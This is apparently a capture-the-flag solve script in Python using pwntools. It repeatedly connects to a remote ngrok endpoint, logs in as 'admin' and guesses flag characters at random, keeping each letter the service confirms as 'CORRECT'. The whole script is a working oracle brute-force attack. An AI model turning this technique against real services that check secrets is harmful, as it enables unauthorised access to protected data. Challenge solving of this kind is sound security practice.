from pwn import *
import string
import random
import time
context.log_level='critical'
flag={}
alps=list(string.ascii_lowercase+"{}_")
strflag = list("___________________________")
while True:
	p=remote("2.tcp.ngrok.io",13162)
	p.clean()
	time.sleep(0.3)
	p.sendline("1")
	p.clean()
	time.sleep(0.6)
	p.sendline("admin")
	p.clean()
	time.sleep(0.6)
	letter = random.choice(alps)
	p.sendline(letter)
	time.sleep(0.6)
	outp = p.recv()[33:90].strip("\n").split()
	#print(outp)
	try:
		if outp[6] == "CORRECT":
			#print(outp[1],letter)
			flag[outp[1]] = letter
			strflag[int(outp[1])] = letter
			#print(flag)
			print(''.join(strflag))
	except:
		pass
	p.close()
